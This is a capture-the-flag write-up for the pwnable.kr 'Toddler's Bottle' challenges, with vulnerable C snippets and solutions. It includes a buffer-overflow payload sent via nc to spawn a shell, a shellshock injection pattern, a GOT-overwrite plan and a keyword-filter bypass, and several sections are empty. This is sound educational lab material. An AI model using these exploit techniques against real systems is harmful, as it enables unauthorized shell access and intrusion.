# PWNABLE.KR

This is a website that features 4 levels of CTF challenges.

```
[Toddler's Bottle] - very easy challenges with simple mistakes.
[Rookiss] - typical bug exploitation challenges for rookies.
[Grotesque] - these challenges ar egrotesque-y. painful to solve it, but very tasty flag :)
[Hacker's Secret] - intended solutions for thes echallenges involves special techniques.
```

## Toddler's Bottle

### fd

```c
int fd = atoi ( argv[1] ) - 0x1234;
int len = 0;
len = read(fd, buf, 32);
if(!strcmp("LETMEWIN\n", buf)){
  printf("good job :)\n");
}
```

So we need to pass in a number that when 0x1234 is subtracted from it the program reads 'LETMEWIN'. This can be done if we pass 0x1234 to the program because that will return a file descriptor of 0 which on linux is stdin so we just type in 'LETMEWIN' and we get our key.

### collision

```c
unsigned long hashcode = 0x21dd09ec;
unsigned long check_password(const char* p){
  int* ip = (int*)p;
  int i;
  for(i=0; i<5; i++){
    res += ip[i];
  }
  return res;
}
int main(int argc, char* argv[]){
  if(strlen(argv[1]) != 20){
    return 0;
  }
  if(hashcode == check_password(argv[1])){
    sys("/bin/cat flag");
  }
}
```

We need to put a password of 20 characters to get past the first check. Then it checks our password against the value 0x21dd09ec by running it through a basic hashing method. The hashing method treats our string as an array of ints instead of chars so inside the 4 loop we are adding up the values of blocks of 4 characters. We can manipulate this easily by having 16 0x01 characters and the remaining 4 we have add up to 0x21dd09ec.

```bash
./col `python -c "import sys;sys.stdout.write('\x01'*16+'\xe8\x05\xd9\x1d')"`
```

### bof

```c
void func(int key){
  char overflowme[32];
  printf("overflow me : ");
  gets(overflowme);
  if(key == 0xcafebabe){
    system("/bin/sh");
  }
}
int main(int argc, char* argv[]){
  func(0xdeabdeef);
}
```

This is a simple buffer overflow to change a variable. All that is required is to input 32 characters followed by 0xcafebabe. We just open gdb, set a breakpoint after the gets, then run with a long string that has recognizable segments such as 'AAAABBBB....YYYYZZZZ'. Once we get to the break point we check what value was being checked in the if statement. It turns out to be 'NNNN' so we need an offset of 52 to get to the variable we want to overwrite and then 0xcafebabe. The if statement just spawns /bin/sh so we need to do a trick with our input so we can type our commands. 

```bash
(python -c "import sys;sys.stdout.write('A'*52+'\xbe\xba\xfe\xca')";cat) | nc pwnable.kr 9000
```

### flag

This is the first binary problem so we download it and we can run strings on it to see if anything pops out as the flag. There are a lot of random strings so it looks like it is obfuscated some but part of the way up we see the string:

```
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
```

After we run 'upx -d flag' we get the unpacked file. Running strings on that we find it is readable so we just search through the list to find our flag.

### passcode

```c
int login(){
  int passcode1;
  int passcode2;
  scanf("%d", passcode1);
  fflush(stdin);
  scanf("%d", passcode2);
  if(passcode1==338150 && passcode2==13371337){
    system("/bin/cat flag");
  }
}
void welcome(){
  char name[100];
  scanf("%100s", name);
  printf("Welcome Is!\n", name);
}
int main(){
  welcome();
  login();
}
```

Initially looking at this code we see that the scanf is wrong. It should be scanf("%d", &passcode1) so in it's current form we can write anything to the address of the initial value of passcode. We need a way to control the initial value so we open up gdb. The only thing before the passcode scanf is one for the name. So looking at that we see at 0x0804862f that the variable is at [ebp - 0x70]. Continuing down the disassembly there is no push or pop to remove this variable so let's go check where passcode is located inside login. At 0x0804857c the value is loaded from [ebp - 0x10]. The difference between 0x70 and 0x10 is 0x60 or 96. This means it is loaded from inside the name variable so we are able to edit it. Now that we can write anywhere we can just jump to inside the if statement by overwriting the global offset table of fflush. The system call argument is loaded at 0x080485e3, which converted to decimal because of the %d in scanf is 134514147, so that is where we need to jump to and the value to overwrite is at 0x0804a004 and we can easily form our exploit.

### random

```c
int main(){
  unsigned int random;
  random = rand();
  unsigned int key=0;
  scanf("%d", &key);
  if((key^random)==0xdeadbeef){
    printf("GoodA\n");
  }
}
```

Looking at the code srand is never called so the value of random is always the same. We just xor rand() and 0xdeadbeef to get the key.

### input

### leg

### mistake

The main mistake in this file is:

```c
if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){}
```

This is a problem because it is the same as:

```c
if(fd=(open("/home/mistake/password",O_RDONLY,0400) < 0)){}
```

Looking at the 2nd one it is clear to see that fd will always be 0 or 1 but because the file can always be open fd will be 0. Further down the file it gets input with scanf and then uses an xor function on that input.

```c
#define PW_LEN 10
#define XORKEY 1
void xor(char* s, int len){
  int i;
  for(i=0; i<len; i++){
    s[i] ^= XORKEY;
  }
}
```

This function xor's the bottom byte of the char. So we just need to put in 2 strings of length 10 where they will match after the 2nd is put through the xor.

### shellshock

This is an example of the shellshock bug. We need to create an environment variable that contains:

```bash
() { :; }; command
```

Then we just run the program and get our flag.

###coin1

### blackjack

Found this by just playing around some. You can bet negative numbers or very large numbers.

### lotto

The problem for this lies in the check for the match.

```c
for(i=0; i<6; i++){
  for(j=0; j<6; j++){
    if(lotto[i] == submit[j]){
      match++;
    }
  }
}
if(match == 6){
  system("/bin/cat");
}
```

All that needs to be done is to have 6 of the characters match in any order. The easier way is to just input 6 of the same characters so that the chosen character only needs to appear once in the lotto string. Just need to create a loop to keep inputing the same character until you get the flag.

### cmd1

```c
int filter(char* cmd){
  int r = 0;
  r += strstr(cmd, "flag") != 0;
  r += strstr(cmd, "sh") != 0;
  r += strstr(cmd, "tmp") != 0;
  return r;
}
int main(int argc, char* argv[], char** envp){
  putenv("PATH=/fuckyouverymuch");
  if(filter(argv[1])) return 0;
  system(argv[1]);
  return 0;
}
```

All that needs to happen here is to pass in a command that does not contain flag, sh, or tmp but still print out the flag. 

```
./cmd1 "/bin/cat f*"
```

### cmd2

This is the same as the previous except it clears all the environment variables and checks more words. Those words are PATH, =, export, /, `, flag.